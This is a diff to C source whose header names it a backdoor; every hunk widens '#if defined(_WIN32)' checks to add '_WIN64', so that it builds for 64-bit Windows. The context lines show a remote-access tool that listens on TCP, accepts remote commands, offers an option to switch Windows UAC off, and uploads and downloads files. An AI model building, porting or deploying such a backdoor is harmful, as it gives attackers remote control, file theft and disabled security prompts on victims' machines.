@@ -16,7 +16,7 @@
  * Linux compile run: gcc -o backdoor backdoor.c
  */
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 	#include <winsock2.h>
 	#include <windows.h>
 #else
@@ -47,7 +47,7 @@ int main(argc,argv)
 	char buf[BUFSIZ];
 	char msg[BUFSIZ];
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 	WSADATA wsaData;
 	ZeroMemory(&wsaData,sizeof(wsaData));
 	if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0) {
@@ -62,13 +62,13 @@ int main(argc,argv)
 		errno = 0;
 		if((serverfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
 			fprintf(stderr,"Error: %s\n",strerror(errno));
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			WSACleanup();
 #endif
 			return -1;
 		}
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 		ZeroMemory(&server,sizeof(server));
 #else
 		bzero(&server,sizeof(server));
@@ -82,7 +82,7 @@ int main(argc,argv)
 		errno = 0;
 		if(bind(serverfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
 			fprintf(stderr,"Error: %s\n",strerror(errno));
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			closesocket(serverfd);
 			WSACleanup();
 #else
@@ -95,7 +95,7 @@ int main(argc,argv)
 		errno = 0;
 		if(listen(serverfd,1) < 0) {
 			fprintf(stderr,"Error: %s\n",strerror(errno));
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			closesocket(serverfd);
 			WSACleanup();
 #else
@@ -118,7 +118,7 @@ int main(argc,argv)
 					puts("Couldn't send intro text.\n");
 				}
 				handle_clients(&clientfd,inet_ntoa(client.sin_addr));
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				if(closesocket(clientfd) == 0) {
 					printf("%s:%d client disconnected.\n",
 						inet_ntoa(client.sin_addr),
@@ -136,7 +136,7 @@ int main(argc,argv)
 			}
 		}
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 		closesocket(serverfd);
 		WSACleanup();
 #else
@@ -192,7 +192,7 @@ void handle_clients(socket,address)
 		} else if(strcmp(cmd,"cmd") == 0) {
 			handle_commands(socket,address);
 		} else if(strcmp(cmd,"uac") == 0) {
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			send(*socket,"Turn (Off/On)? ",15,0);
 			get_cmd(socket,address,cmd,sizeof(cmd));
 			if(stricmp(cmd,"Off") == 0) {
@@ -290,13 +290,13 @@ int upload_file(load,address,filename,isserver)
 
 	if((sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0) {
 		perror("socket()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 		WSACleanup();
 #endif
 		return 1;
 	}
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 	ZeroMemory(&server,sizeof(server));
 	ZeroMemory(&client,sizeof(client));
 #else
@@ -310,7 +310,7 @@ int upload_file(load,address,filename,isserver)
 
 		if(bind(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
 			perror("bind()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			closesocket(sockfd);
 			WSACleanup();
 #else
@@ -322,7 +322,7 @@ int upload_file(load,address,filename,isserver)
 
 		if(listen(sockfd,1) < 0) {
 			perror("bind()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			closesocket(sockfd);
 			WSACleanup();
 #else
@@ -334,7 +334,7 @@ int upload_file(load,address,filename,isserver)
 
 		if((clientfd = accept(sockfd,(struct sockaddr*)NULL,NULL)) < 0) {
 			puts("Error: Cannot accept client connection sorry :(");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			closesocket(sockfd);
 			WSACleanup();
 #else
@@ -347,7 +347,7 @@ int upload_file(load,address,filename,isserver)
 		if(load[1] == 'u') {
 			if(getcwd(curdir,sizeof(curdir)) == NULL) {
 				perror("getcwd()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(clientfd);
 				closesocket(sockfd);
 				WSACleanup();
@@ -360,7 +360,7 @@ int upload_file(load,address,filename,isserver)
 			strncat(curdir,filename,sizeof(curdir));
 
 			if((file = fopen(curdir,"wb")) == NULL) {
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(clientfd);
 				closesocket(sockfd);
 				WSACleanup();
@@ -382,7 +382,7 @@ int upload_file(load,address,filename,isserver)
 		} else if(load[1] == 'd') {
 			if(getcwd(curdir,sizeof(curdir)) == NULL) {
 				perror("getcwd()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(clientfd);
 				closesocket(sockfd);
 				WSACleanup();
@@ -395,7 +395,7 @@ int upload_file(load,address,filename,isserver)
 			strncat(curdir,filename,sizeof(curdir));
 
 			if((file = fopen(curdir,"rb")) == NULL) {
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(clientfd);
 				closesocket(sockfd);
 				WSACleanup();
@@ -426,7 +426,7 @@ int upload_file(load,address,filename,isserver)
 
 		if(connect(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0) {
 			puts("Error: Cannot connect to server sorry :(");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 			closesocket(sockfd);
 			WSACleanup();
 #else
@@ -439,7 +439,7 @@ int upload_file(load,address,filename,isserver)
 		if(load[1] == 'u') {
 			if(getcwd(curdir,sizeof(curdir)) == NULL) {
 				perror("getcwd()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(sockfd);
 				WSACleanup();
 #else
@@ -451,7 +451,7 @@ int upload_file(load,address,filename,isserver)
 
 			if((file = fopen(curdir,"rb")) == NULL) {
 				printf("Error: Cannot open file %s.\n",curdir);
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(sockfd);
 				WSACleanup();
 #else
@@ -471,7 +471,7 @@ int upload_file(load,address,filename,isserver)
 		} else if(load[1] == 'd') {
 			if(getcwd(curdir,sizeof(curdir)) == NULL) {
 				perror("getcwd()");
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(sockfd);
 				WSACleanup();
 #else
@@ -483,7 +483,7 @@ int upload_file(load,address,filename,isserver)
 
 			if((file = fopen(curdir,"wb")) == NULL) {
 				printf("Error: Cannot open file %s.\n",curdir);
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 				closesocket(sockfd);
 				WSACleanup();
 #else
@@ -506,7 +506,7 @@ int upload_file(load,address,filename,isserver)
 		}
 		fclose(file);
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 		closesocket(sockfd);
 		WSACleanup();
 #else
@@ -515,7 +515,7 @@ int upload_file(load,address,filename,isserver)
 		return 0;
 	}
 
-#if defined(_WIN32)
+#if defined(_WIN32) || (_WIN64)
 	closesocket(clientfd);
 	closesocket(sockfd);
 	WSACleanup();
